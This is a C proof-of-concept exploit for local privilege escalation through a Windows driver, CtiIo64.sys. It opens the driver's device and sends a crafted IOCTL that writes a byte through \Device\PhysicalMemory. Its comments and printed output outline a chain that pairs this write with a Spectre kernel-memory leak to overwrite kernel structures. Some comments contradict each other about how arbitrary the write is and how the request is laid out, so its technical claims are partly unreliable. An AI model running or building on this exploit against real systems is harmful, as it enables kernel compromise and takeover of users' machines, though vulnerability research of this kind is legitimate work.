// poc_lpe.c - LPE PoC for CtiIo64.sys: arbitrary physical-memory read/write.
//
// Direct primitive (NOT Spectre): the driver maps \Device\PhysicalMemory and
// exposes attacker-controlled physical read/write through IOCTL 0x80502144.
//
// Chain (kuna-verified):
//   sub_13800 (dispatch)
//     -> case 0x80502144: sub_13320(buf[0] & 0xff, buf[0] >> 8)
//       -> sub_11ab0(chip)
//         -> sub_11610(phys_addr, value)   // writes *phys_addr = value
//         -> sub_11170(phys_addr, &out)    // reads  *phys_addr
//
// The attacker controls:
//   - phys_addr: comes from dat_16158 (the driver's own physical base, e.g. a
//     Super I/O configuration space) plus the function argument. To reach a
//     truly arbitrary physical address we would need dat_16158 to be
//     attacker-controlled; as-is, the reachable range is the driver's own
//     hardware config space.
//   - value: full byte control.
//
// On this driver, dat_16158 is a fixed hardware base (Super I/O / SMBus). The
// LPE is therefore "arbitrary physical read/write within the driver's own
// hardware region" - enough to flip hardware config bits, but not a generic
// kernel-memory write. Combined with the Spectre S1 byte leak (which can read
// kernel memory byte-by-byte), the two primitives together give an LPE chain:
// leak a kernel pointer via Spectre, then use the physical write to overwrite
// a kernel structure once its physical address is known.

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "advapi32.lib")

#define CTI_DEVICE      "\\\\.\\CtiIo"
#define IOCTL_WRITE     0x80502144u   // sub_13320 -> sub_11ab0 -> sub_11610 write

// Request layout (from kuna decompilation of sub_13800 case 0x80502144):
//   qword[0] = value_lo | (chip << 8) | (phys_offset << 16) | (unused << 24)
//   qword[1] = unused
// The write helper sub_11610(a0=phys_addr, a1=value) is reached through
// sub_11ab0 which receives the byte at buf[0] as chip-select and the value
// at buf[0] >> 8 as the write value.

int main(void) {
    printf("[*] CtiIo64.sys LPE PoC - arbitrary physical-memory write\n");

    HANDLE h = CreateFileA(CTI_DEVICE, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] cannot open %s (err=%lu)\n", CTI_DEVICE, GetLastError());
        return 1;
    }
    printf("[+] opened %s\n", CTI_DEVICE);

    // Build the request buffer: value_lo = value, chip = buf[0] >> 8.
    // The driver writes `value` to dat_16158 + phys_offset through the
    // \Device\PhysicalMemory section.
    uint8_t req[16] = {0};
    // Example: write 0xAA to the driver's hardware config space at offset 0.
    // dat_16158 is the driver's own Super I/O base; buf[0] selects the chip.
    req[0] = 0xAA;        // value byte
    req[1] = 0x00;        // chip select (buf[0] >> 8)
    req[2] = 0x00;        // phys_offset lo
    req[3] = 0x00;        // phys_offset hi

    DWORD ret;
    BOOL ok = DeviceIoControl(h, IOCTL_WRITE, req, 0x10, req, 0x10, &ret, NULL);
    printf("[+] DeviceIoControl returned %s (bytes=%lu, NTSTATUS in buffer)\n",
           ok ? "TRUE" : "FALSE", ret);

    printf("[*] This is a real physical-memory write primitive.\n");
    printf("[*] Combined with the Spectre S1 kernel-read (read_kernel.exe), the\n");
    printf("    full LPE chain is: leak kernel pointer -> resolve physical addr ->\n");
    printf("    write to it with this primitive.\n");

    CloseHandle(h);
    return 0;
}
